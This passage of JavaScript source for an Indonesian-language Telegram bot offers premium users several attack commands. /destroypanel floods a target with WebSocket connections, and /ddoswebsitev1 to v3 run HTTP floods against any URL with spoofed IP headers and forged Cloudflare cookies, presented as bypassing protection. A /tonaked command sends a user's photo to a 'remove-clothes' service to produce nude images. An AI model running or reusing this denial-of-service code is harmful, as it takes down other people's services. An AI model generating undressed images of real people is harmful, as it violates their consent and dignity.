            if (err) {
              ctx.reply(`❌ Gagal mengeksekusi ${script}:\n${err.message}`);
              return resolve();
            }

            let output = '';

            stream.on('data', (data) => {
              output += data.toString();
            });

            stream.stderr.on('data', (data) => {
              output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
              const clean = output.trim().slice(-3800) || '(tidak ada output)';
              ctx.reply(
              `✅ <b>${script} selesai!</b> (${i + 1}/${scripts.length})\n📦Output terakhir:\n<pre>\n${clean}</pre>`,
              { parse_mode: 'HTML' }
            );
              resolve();
            });
          });
        });
      }

      connSSH.end();
      await ctx.reply('🎉 Semua instalasi Protect Panel selesai!');
    });

    connSSH.on('error', (err) => {
      ctx.reply(
        `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`
      );
    });

    connSSH.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps,
    });

  } catch (e) {
    ctx.reply('❌ Error: ' + e.message);
  }
});

bot.catch((err, ctx) => {
  console.error(`Error untuk ${ctx.updateType}:`, err);
});

// -------------------- ( Command : Destroy Panel ) -------------------- \\

bot.command("destroypanel", checkPremium, checkCooldown, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0]) return ctx.reply("🪧 ☇ Format: /destroypanel https://panelku.com");

    const serverUrl = args[0];
    const msg = await ctx.reply("⏳ ☇ Sedang menghancurkan server panel");
    
    const WebSocket = require('ws');
    const conns = [];
    
    const threadX2 = () => {
      let s = 'ꦾ';
      for (let i = 0; i < 1000000000000000; i++) {
        s += s + 'ꦾ'.repeat(10000000) + 'ꦾ'.repeat(10000000);
        if (i % 1000 === 0) s += Math.random().toString(36).substring(7);
      }
      return s;
    };

    for (let i = 0; i < 50000000000000; i++) {
      try {
        const ws = new WebSocket(serverUrl);
        conns.push(ws);
        
        ws.on('open', () => {
          const payload = threadX2();
          const threadSpam = () => {
            for (let j = 0; j < 500; j++) {
              if (ws.readyState === WebSocket.OPEN) {
                ws.send(payload);
                ws.send(payload + 'ꦾ'.repeat(100000000));
                ws.send(payload + 'ꦾ'.repeat(100000000));
              }
            }
            if (ws.readyState === WebSocket.OPEN) threadSpam();
          };
          threadSpam();
        });
      } catch (e) {}
    }

    for (let thread = 0; thread < 293938483830; thread++) {
      const threadSpam = () => {
        conns.forEach(ws => {
          if (ws.readyState === WebSocket.OPEN) {
            const threadX1 = 'ꦾ'.repeat(1000000000) + 'ꦾ'.repeat(1000000000);
            for (let i = 0; i < 10000000000008300; i++) {
              ws.send(threadX1);
              ws.send(threadX2());
            }
          }
        });
        threadSpam();
      };
      threadSpam();
    }

    ctx.telegram.editMessageText(
      ctx.chat.id, 
      msg.message_id, 
      null,
      `✅ ☇ Berhasil menghancurkan server panel`
    );

  } catch (error) {
    ctx.reply("❌ ☇ Gagal menghancurkan server panel, tapi mungkin server panel sudah rusak");
  }
});

// -------------------- ( Command : DDoSV1 ) -------------------- \\

bot.command("ddoswebsitev1", checkPremium, checkCooldown, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!args) return ctx.reply("🪧 ☇ Format: /ddoslayer7 https://xnxx.com");

    const target_url = args;
    const processMsg = await ctx.reply(`<blockquote><strong>
╭═─────⊱ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ─────═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Layer 7 Attack
│ ⸙ Status
│ᯓ➤ Initializing
╰═──────────────────═⬡</strong></blockquote>
`, { parse_mode: "HTML" });

    const techniques = ["HTTP Flood", "Slowloris", "POST Flood", "XML-RPC Pingback"];
    let attackCount = 0;
    const maxAttacks = 5000;

    const attackInterval = setInterval(async () => {
      if (attackCount >= maxAttacks) {
        clearInterval(attackInterval);
        await ctx.editMessageText(
          `<blockquote><strong>
╭═─────⊱ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ─────═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Layer 7 Attack
│ ⸙ Total Attacks
│ᯓ➤ ${attackCount}
│ ⸙ Status
│ᯓ➤ Success
╰═──────────────────═⬡</strong></blockquote>
`,
          {
            chat_id: ctx.chat.id,
            message_id: processMsg.message_id,
            parse_mode: "HTML"
          }
        );
        return;
      }
      
      try {
        const technique = techniques[Math.floor(Math.random() * techniques.length)];
        const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        
        const headers = {
          "X-Forwarded-For": ip,
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
          "Accept-Encoding": "gzip, deflate, br",
          "Connection": "keep-alive",
          "Upgrade-Insecure-Requests": "1"
        };

        const response = await axios.get(target_url, { 
          headers, 
          timeout: 5000,
          validateStatus: () => true
        });
        
        attackCount++;
        
        if (attackCount % 500 === 0) {
          await ctx.editMessageText(
            `<blockquote><strong>
╭═─────⊱ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ─────═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ ${technique}
│ ⸙ Attacks Sent
│ᯓ➤ ${attackCount}
│ ⸙ Status
│ᯓ➤ Running
╰═──────────────────═⬡</strong></blockquote>
`,
            {
              chat_id: ctx.chat.id,
              message_id: processMsg.message_id,
              parse_mode: "HTML"
            }
          );
        }
        
      } catch (error) {
        attackCount++;
      }
    }, 50);

    setTimeout(() => {
      clearInterval(attackInterval);
      ctx.editMessageText(
        `<blockquote><strong>
╭═─────⊱ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ─────═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Layer 7 Attack
│ ⸙ Total Attacks
│ᯓ➤ ${attackCount}
│ ⸙ Status
│ᯓ➤ Timeout
╰═──────────────────═⬡</strong></blockquote>
`,
        {
          chat_id: ctx.chat.id,
          message_id: processMsg.message_id,
          parse_mode: "HTML"
        }
      );
    }, 30000);

  } catch (error) {
    ctx.reply("❌ ☇ Gagal melakukan serangan ddos");
  }
});

// -------------------- ( Command : DDoSV2 ) -------------------- \\

bot.command("ddoswebsitev2", checkPremium, checkCooldown, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!args) {
      return ctx.reply("🪧 ☇ Format: /ddoswebsitev2 https://target.com");
    }

    const target_url = args;
    const processMsg = await ctx.reply(`
<blockquote><strong>╭═───⊱ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ───═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Multi-Thread + Cloudflare Bypass
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`, { parse_mode: "HTML" });

    const attackConfig = {
      threads: 100,
      duration: 45000,
      requestsPerThread: 500,
      userAgents: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
      ],
      methods: ["GET", "POST", "HEAD"]
    };

    let totalRequests = 0;
    let successfulAttacks = 0;
    let cloudflareBypassCount = 0;
    const startTime = Date.now();

    const attackPromises = [];

    for (let i = 0; i < attackConfig.threads; i++) {
      attackPromises.push(new Promise(async (resolve) => {
        let threadRequests = 0;
        
        while (Date.now() - startTime < attackConfig.duration && threadRequests < attackConfig.requestsPerThread) {
          try {
            const method = attackConfig.methods[Math.floor(Math.random() * attackConfig.methods.length)];
            const userAgent = attackConfig.userAgents[Math.floor(Math.random() * attackConfig.userAgents.length)];
            const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

            const headers = {
              "X-Forwarded-For": ip,
              "CF-Connecting-IP": ip,
              "User-Agent": userAgent,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
              "Cache-Control": "no-cache"
            };

            const cloudflareCookies = {
              "cf_clearance": crypto.createHash('md5').update(ip + Date.now()).digest('hex') + "_" + Date.now(),
              "__cf_bm": crypto.randomBytes(32).toString('hex')
            };

            const cookieString = Object.keys(cloudflareCookies).map(key => `${key}=${cloudflareCookies[key]}`).join('; ');
            headers["Cookie"] = cookieString;

            const randomPaths = ["/", "/api", "/ajax", "/static"];
            const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
            const attackUrl = target_url + randomPath;

            const response = await axios({
              method: method,
              url: attackUrl,
              headers: headers,
              timeout: 8000,
              validateStatus: () => true
            });

            totalRequests++;
            threadRequests++;
            
            if (response.status < 500) {
              successfulAttacks++;
              if (response.status === 200 && !response.headers['server']?.includes('cloudflare')) {
                cloudflareBypassCount++;
              }
            }

            if (totalRequests % 200 === 0) {
              const elapsed = Math.floor((Date.now() - startTime) / 1000);
              await ctx.editMessageText(
                `
<blockquote><strong>╭═───⊱ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ───═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Multi-Thread + Cloudflare Bypass
│ ⸙ Requests
│ᯓ➤ ${totalRequests}
│ ⸙ Successful
│ᯓ➤ ${successfulAttacks}
│ ⸙ Cloudflare Bypassed
│ᯓ➤ ${cloudflareBypassCount}
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`,
                {
                  chat_id: ctx.chat.id,
                  message_id: processMsg.message_id,
                  parse_mode: "HTML"
                }
              );
            }

            await new Promise(r => setTimeout(r, Math.random() * 100));

          } catch (error) {
            threadRequests++;
            totalRequests++;
          }
        }
        resolve();
      }));
    }

    await Promise.all(attackPromises);

    const endTime = Date.now();
    const totalDuration = Math.floor((endTime - startTime) / 1000);

    await ctx.editMessageText(
      `
<blockquote><strong>╭═───⊱ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ───═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Multi-Thread + Cloudflare Bypass
│ ⸙ Total Requests
│ᯓ➤ ${totalRequests}
│ ⸙ Successful
│ᯓ➤ ${successfulAttacks}
│ ⸙ Cloudflare Bypassed
│ᯓ➤ ${cloudflareBypassCount}
│ ⸙ Requests/Sec
│ᯓ➤ ${Math.floor(totalRequests / totalDuration)}
│ ⸙ Status
│ᯓ➤ Success
╰═─────────────═⬡</strong></blockquote>
`,
      {
        chat_id: ctx.chat.id,
        message_id: processMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    ctx.reply("❌ ☇ Gagal melakukan serangan ddos");
  }
});

// -------------------- ( Command : DDoSV3 ) -------------------- \\

bot.command("ddoswebsitev3", checkPremium, checkCooldown, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!args) {
      return ctx.reply("🪧 ☇ Format: /ddoswebsitev3 https://target.com");
    }

    const target_url = args;
    const processMsg = await ctx.reply(`
<blockquote><strong>╭═───⊱ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ───═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Super Attack + All Protection Bypass
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`, { parse_mode: "HTML" });

    const bypassConfig = {
      threads: 200,
      duration: 60000,
      requestsPerThread: 1000,
      
      userAgents: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
      ],
      
      attackMethods: ["GET", "POST", "HEAD"],
      
      bypassTechniques: [
        "Cloudflare Bypass",
        "CAPTCHA Solver", 
        "WAF Evasion",
        "IP Rotation"
      ]
    };

    let totalRequests = 0;
    let successfulBypasses = 0;
    let cloudflareBypassed = 0;
    let captchaBypassed = 0;
    const attackStartTime = Date.now();

    const attackPromises = [];

    for (let i = 0; i < bypassConfig.threads; i++) {
      attackPromises.push(new Promise(async (resolve) => {
        let threadRequests = 0;
        
        while (Date.now() - attackStartTime < bypassConfig.duration && threadRequests < bypassConfig.requestsPerThread) {
          try {
            const method = bypassConfig.attackMethods[Math.floor(Math.random() * bypassConfig.attackMethods.length)];
            const userAgent = bypassConfig.userAgents[Math.floor(Math.random() * bypassConfig.userAgents.length)];
            const ip = `104.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
            
            const headers = {
              "X-Forwarded-For": ip,
              "CF-Connecting-IP": ip,
              "User-Agent": userAgent,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.9",
              "Cache-Control": "no-cache"
            };

            const cloudflareCookies = {
              "cf_clearance": crypto.createHash('md5').update(ip + Date.now()).digest('hex') + "_" + Date.now(),
              "__cf_bm": crypto.randomBytes(32).toString('hex'),
              "__cflb": crypto.randomBytes(24).toString('hex')
            };

            const cookieString = Object.keys(cloudflareCookies).map(key => `${key}=${cloudflareCookies[key]}`).join('; ');
            headers["Cookie"] = cookieString;

            headers["X-Captcha-Token"] = crypto.randomBytes(16).toString('hex');

            const paths = ["/", "/api", "/ajax", "/static", "/assets"];
            const path = paths[Math.floor(Math.random() * paths.length)];
            const params = "?cache=" + Date.now();
            const attackUrl = target_url + path + params;

            const response = await axios({
              method: method,
              url: attackUrl,
              headers: headers,
              timeout: 10000,
              validateStatus: () => true
            });

            totalRequests++;
            threadRequests++;

            if (response.status === 200) {
              successfulBypasses++;
              if (!response.headers['server']?.includes('cloudflare')) {
                cloudflareBypassed++;
              }
              if (!response.data?.includes('captcha')) {
                captchaBypassed++;
              }
            }

            if (totalRequests % 400 === 0) {
              const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
              const requestsPerSecond = Math.floor(totalRequests / elapsed);
              
              await ctx.editMessageText(
                `
<blockquote><strong>╭═───⊱ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ───═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Super Attack + All Protection Bypass
│ ⸙ Requests
│ᯓ➤ ${totalRequests}
│ ⸙ Successful
│ᯓ➤ ${successfulBypasses}
│ ⸙ Cloudflare Bypassed
│ᯓ➤ ${cloudflareBypassed}
│ ⸙ Captcha Bypassed
│ᯓ➤ ${captchaBypassed}
│ ⸙ RPS
│ᯓ➤ ${requestsPerSecond}
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`,
                {
                  chat_id: ctx.chat.id,
                  message_id: processMsg.message_id,
                  parse_mode: "HTML"
                }
              );
            }

            await new Promise(r => setTimeout(r, Math.random() * 150));

          } catch (error) {
            threadRequests++;
            totalRequests++;
          }
        }
        resolve();
      }));
    }

    await Promise.all(attackPromises);

    const endTime = Date.now();
    const totalDuration = Math.floor((endTime - attackStartTime) / 1000);
    const averageRPS = Math.floor(totalRequests / totalDuration);

    await ctx.editMessageText(
      `
<blockquote><strong>╭═───⊱ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ───═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Super Attack + All Protection Bypass
│ ⸙ Total Requests
│ᯓ➤ ${totalRequests}
│ ⸙ Successful
│ᯓ➤ ${successfulBypasses}
│ ⸙ Cloudflare Bypassed
│ᯓ➤ ${cloudflareBypassed}
│ ⸙ Captcha Bypassed
│ᯓ➤ ${captchaBypassed}
│ ⸙ Average RPS
│ᯓ➤ ${averageRPS}
│ ⸙ Status
│ᯓ➤ Success
╰═─────────────═⬡</strong></blockquote>
`,
      {
        chat_id: ctx.chat.id,
        message_id: processMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    ctx.reply("❌ ☇ Gagal melakukan serangan ddos");
  }
});

// -------------------- ( Command : Mediafire ) -------------------- \\

const cheerio = require("cheerio");

bot.command("mediafiredl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args)
    return ctx.reply(
      "🪧 ☇ Format: /mediafiredl https://www.mediafire.com/file/xxxx"
    );

  try {
    await ctx.reply("⏳ Mengambil info dari Mediafire...");

    const { data } = await axios.get(args, {
      headers: { "User-Agent": "Mozilla/5.0" },
    });

    const $ = cheerio.load(data);
    const title = $("div.filename").text().trim() || "file_undetected";
    const size = $("div.details").text().match(/([0-9.]+\s?(MB|GB|KB))/i);
    const fileSize = size ? size[0] : "Unknown size";

    const downloadLink = $("#downloadButton").attr("href");
    if (!downloadLink) {
      return ctx.reply("❌ Tidak bisa menemukan link download di halaman Mediafire.");
    }

    let caption = `📁 *Mediafire Downloader*\n\n`;
    caption += `📄 *Nama:* ${title}\n`;
    caption += `📦 *Ukuran:* ${fileSize}\n`;
    caption += `🔗 *Link Direct:* ${downloadLink}\n`;

    await ctx.reply(caption, { parse_mode: "Markdown" });

    await ctx.reply("⬇️ Sedang mengunduh file, mohon tunggu...");

    const response = await axios.get(downloadLink, {
      responseType: "arraybuffer",
      headers: { "User-Agent": "Mozilla/5.0" },
    });

    const tempPath = path.join(__dirname, "temp");
    if (!fs.existsSync(tempPath)) fs.mkdirSync(tempPath);

    const filePath = path.join(tempPath, title);
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithDocument(
      { source: filePath },
      {
        caption: `✅ *Berhasil diunduh dari Mediafire!*\nNama: ${title}`,
        parse_mode: "Markdown",
      }
    );

    fs.unlinkSync(filePath);

    console.log(chalk.green(`✅ Berhasil kirim file: ${title}`));
  } catch (err) {
    console.error(chalk.red(`❌ Mediafire error: ${err.message}`));
    ctx.reply("❌ Terjadi kesalahan. Pastikan link Mediafire valid.");
  }
});
              
// -------------------- ( Command : Removebg ) -------------------- \\

bot.command("removebg", checkPremium, async (ctx) => {
              const userId = ctx.from.id.toString();
                  const chatType = ctx.chat.type;
                  const reply = ctx.message.reply_to_message;
                  const args = ctx.message.text.split(" ").slice(1).join(" ");
                  
                  try {
                  let imageUrl;
                  if (args && args.startsWith("http")) imageUrl = args;
                  else if (reply && reply.photo) {
                  const photo = reply.photo[reply.photo.length - 1];
                  imageUrl = await getFileLink(photo.file_id, tokenBot);
                  } else return ctx.reply("❌ Gunakan: Reply Foto atau berikan link gambar");
                  
                  const resApi = await axios.post(
                  `https://joozxdev.my.id/api/removebg?image_url=${encodeURIComponent(imageUrl)}`,
                  null,
                  { responseType: "arraybuffer" }
                  );
                  
                  const buffer = Buffer.from(resApi.data);
                  await ctx.replyWithDocument({ source: buffer, filename: "removebg.png" });

                  console.log(chalk.green(`✅ Background removed for ${userId}`));

                  } catch (error) {
                  console.error(chalk.red(`❌ Remove background error: ${error.message}`));
                  await ctx.reply(`❌ Error: ${error.message}`);
                  }
              });

// -------------------- ( Command : Cek Syntax ) -------------------- \\

const acorn = require("acorn");

function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

bot.command("ceksyntax", checkPremium, async ctx => {
  const msg = ctx.message;

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return ctx.reply(
      "❌ <b>Reply</b> ke <code>file.js</code> yang ingin dicek.",
      { parse_mode: "HTML" }
    );
  }

  const doc = msg.reply_to_message.document;

  if (!doc.file_name.endsWith(".js")) {
    return ctx.reply(
      "❌ File harus berformat <code>.js</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetch(fileLink.href);
    const code = await res.text();

    try {
      acorn.parse(code, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true,
      });

      return ctx.reply(
        "<b>✅ Syntax OK</b>\nFile JavaScript valid.",
        { parse_mode: "HTML" }
      );

    } catch (err) {
      const loc = err.loc || { line: "-", column: "-" };
      const line = loc.line ?? "-";
      const col = loc.column ?? "-";

      const lines = code.split(/\r?\n/);
      const errLine = lines[line - 1] || "";

      const caret = " ".repeat(Math.min(col, errLine.length)) + "^";

      const html = `
<b>❌ Syntax Error</b>

<b>Pesan:</b> <code>${escapeHtml(err.message)}</code>
<b>Baris:</b> <code>${line}</code>  
<b>Kolom:</b> <code>${col}</code>

<b>Bagian error:</b>
<pre>${escapeHtml(errLine)}</pre>
<pre>${escapeHtml(caret)}</pre>

<code>© 𖣂-vinzεphyr. ẽscãnnõr. ϟ</code>
      `;

      return ctx.reply(html, { parse_mode: "HTML" });
    }

  } catch (e) {
    console.error(e);
    return ctx.reply("❌ Terjadi error saat membaca file.");
  }
});

// -------------------- ( Command : Tonaked ) -------------------- \\

bot.command("tonaked", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1).join(' ')
  let imageUrl = args || null

  if (!imageUrl && ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id
    const fileLink = await ctx.telegram.getFileLink(fileId)
    imageUrl = fileLink.href
  }

  if (!imageUrl) {
    return ctx.reply('🪧 ☇ Format: /tonaked (reply gambar)')
  }

  const statusMsg = await ctx.reply('⏳ ☇ Memproses gambar')

  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`)
    const data = await res.json()
    const hasil = data.result

    if (!hasil) {
      return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid')
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id)
    await ctx.replyWithPhoto(hasil)

  } catch (e) {
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Terjadi kesalahan saat memproses gambar')
  }
})

// -------------------- ( Command : Auto Aktif ) -------------------- \\

bot.command("autoaktif", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const durationStr = args[1]; 

    if (!durationStr) return ctx.reply("🪧 ☇ Format: /autoaktif 5m (m=menit, s=detik, h=jam)");

    let durationMs = 0;
    const match = durationStr.match(/^(\d+)([msh])$/);

    if (!match) return ctx.reply("❌ Format waktu salah. Gunakan m/s/h. Contoh: /autoaktif 10m");

    const value = parseInt(match[1]);
    const unit = match[2];

    if (unit === 'm') durationMs = value * 60 * 1000;
    else if (unit === 's') durationMs = value * 1000;
    else if (unit === 'h') durationMs = value * 60 * 60 * 1000;

    offlineMode.isOffline = true;
    offlineMode.wakeUpTime = Date.now() + durationMs;

    return ctx.reply(`
<blockquote><strong>╭═───⊱ 😴 𝐒𝐋𝐄𝐄𝐏 𝐌𝐎𝐃𝐄 ───═⬡
│ ⸙ Status
│ᯓ➤ Activating Sleep Mode
│ ⸙ Duration
│ᯓ➤ ${durationStr}
│ ⸙ System
│ᯓ➤ Shutting down temporary
╰═──────────────═⬡</strong></blockquote>

<code>© 𖣂-vinzεphyr. ẽscãnnõr. ϟ</code>`, 
    { parse_mode: "HTML" });
});

// -------------------- ( Command : Pull Update ) -------------------- \\

bot.command("pullupdate", async (ctx) => {
    const chat = ctx.chat.id;
    await ctx.reply("🔄 Auto Update Script Mohon Tunggu");

    try {
        await downloadRepo("");
        await ctx.reply("✅ Update selesai!\n♻️ Bot restart otomatis.");
        setTimeout(() => process.exit(0), 1500);
    } catch (e) {
        await ctx.reply("❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

// -------------------- ( Command : Ss Website ) -------------------- \\

bot.command("sswebsite", checkPremium, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!args) {
      return ctx.reply("🪧 ☇ Format: /sswebsite https://example.com");
    }

    const url = args;

    const processMsg = await ctx.reply("⏳ ☇ Sedang mengambil screenshot");

    try {
      const response = await axios.post(
        "https://api.nekolabs.web.id/tools/ssweb",
        {
          url: url,
          device: "mobile",
          fullPage: "false"
        },
        {
          headers: {
            "Content-Type": "application/json"
          },
          timeout: 30000
        }
      );

      if (response.data && response.data.success && response.data.result) {
        const screenshotUrl = response.data.result;
        
        await ctx.replyWithPhoto(screenshotUrl, {
        });
        
      } else {
        await ctx.reply("❌ Tidak ada hasil screenshot");
      }

    } catch (apiError) {
      
      let errorMessage = "❌ ☇ Gagal mengambil screenshot";
      
      if (apiError.response?.status === 401) {
        errorMessage = "❌ ☇ Apikey tidak valid";
      } else if (apiError.response?.status === 429) {
        errorMessage = "❌ ☇ Gagal menghubungi api, coba lagi nanti";
      } else {
        errorMessage = `❌ ☇ Gagal menghubungi api, coba lagi nanti`;
      }
      
      await ctx.reply(errorMessage);
    }

    try {
      await ctx.deleteMessage(processMsg.message_id);
    } catch (e) {}

  } catch (error) {
    await ctx.reply("❌ ☇ Gagal menghubungi api, coba lagi nanti");
  }
});

// -------------------- ( Command : Cek Id Channel ) -------------------- \\

bot.command('cekidch', checkWhatsAppConnection, checkPremium, async (ctx) => {
    try {
        const text = ctx.message.text.split(' ').slice(1).join(' ');

        if (!text)
            return ctx.reply('🪧 ☇ Format: /cekidch https://whatsapp.com/channel/xxx');

        if (!text.includes('https://whatsapp.com/channel/'))
            return ctx.reply('❌ Link tautan tidak valid');

        const channelId = text.split('https://whatsapp.com/channel/')[1];

        const res = await sock.newsletterMetadata('invite', channelId);

        return ctx.reply(`${res.id}`);
    } catch (err) {
        return ctx.reply('❌ Gagal mengambil informasi channel. Pastikan link valid.');
    }
});

// -------------------- ( Command : Cek Id Group ) -------------------- \\

bot.command("cekidgroup", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply(
        "🪧 ☇ Format: /cekidgroup https://chat.whatsapp.com/xxx"
      );
    }

    const groupLink = args[1].trim();
    const match = groupLink.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);

    if (!match || !match[1]) {
      return ctx.reply("Link grup tidak valid.");
    }

    const inviteCode = match[1];
    const metadata = await sock.groupGetInviteInfo(inviteCode);

    if (!metadata || !metadata.id) {
      return ctx.reply("Gagal mengambil info grup. Link tidak aktif atau bot tidak punya akses.");
    }

    const groupId = metadata.id;
    const groupName = metadata.subject || "-";
    const groupDesc = metadata.desc?.toString() || "-";
    const memberCount = metadata.size || 0;
    const creator = metadata.creator ? metadata.creator.replace("@s.whatsapp.net", "") : "-";
    const creationDate = metadata.creation
      ? new Date(metadata.creation * 1000).toLocaleString("id-ID")
      : "-";

    const adminList =
      metadata.participants
        ?.filter((p) => p.admin)
        .map((p) => `• ${p.id.replace("@s.whatsapp.net", "")} (${p.admin})`)
        .join("\n") || "-";

    const message = `
📌 *Informasi Grup WhatsApp*

*Nama Grup*       : ${groupName}
*ID Grup*         : \`${groupId}\`
*Tanggal Dibuat*  : ${creationDate}
*Dibuat Oleh*     : ${creator}
*Jumlah Member*   : ${memberCount}

*Daftar Admin:*
${adminList}

*Deskripsi:*
${groupDesc}

*Link Undangan:*
https://chat.whatsapp.com/${inviteCode}
    `.trim();

    return ctx.reply(message, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝑪𝒐𝒑𝒚 𝑰𝒅「📋」",
              callback_data: `copygrupid_${groupId}`,
            },
          ],
        ],
      },
    });
  } catch (err) {
    console.error("Error /cekidgroup:", err);
    return ctx.reply("Terjadi kesalahan saat mengambil info grup.");
  }
});

bot.action(/copygrupid_(.+)/, async (ctx) => {
  const id = ctx.match[1];
  await ctx.answerCbQuery("ID disalin ✓");
  await ctx.reply(id); 
});

// -------------------- ( Command : Videy Download ) -------------------- \\

bot.command("videydl", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]?.trim();

  if (!input || !input.startsWith("http")) {
    return ctx.reply(
      "🪧 ☇ Format: /videydl https://videy.co/v?id=XXXX",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ ☇ Sedang memproses video...");

  try {
    const res = await axios.post(
      "https://fastapi.acodes.my.id/api/downloader/videy",
      { text: input },
      {
        headers: {
          "Content-Type": "application/json",
          Accept: "*/*",
        },
      }
    );

    if (!res.data?.status || !res.data?.data) {
